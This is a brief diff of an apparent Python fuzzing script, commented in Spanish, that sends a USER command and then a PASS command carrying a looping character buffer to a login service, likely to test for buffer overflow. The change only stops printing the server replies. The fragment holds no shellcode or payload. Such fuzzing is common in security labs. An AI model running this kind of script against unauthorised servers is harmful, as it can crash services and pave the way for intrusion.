@@ -25,10 +25,10 @@ for caracteres in buffer:
 
         # usuario
         s.send(b'USER MrW0l05zyn\r\n')
-        print(s.recv(1024))
+        s.recv(1024)
         # password
         s.send(b'PASS ' + caracteres + b'\r\n')
-        print(s.recv(1024))
+        s.recv(1024)
 
     except Exception as error:
         print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
@@ -37,5 +37,5 @@ for caracteres in buffer:
 
 # cierre de conexión
 s.send(b"QUIT\r\n")
-print(s.recv(1024))
+s.recv(1024)
 s.close()
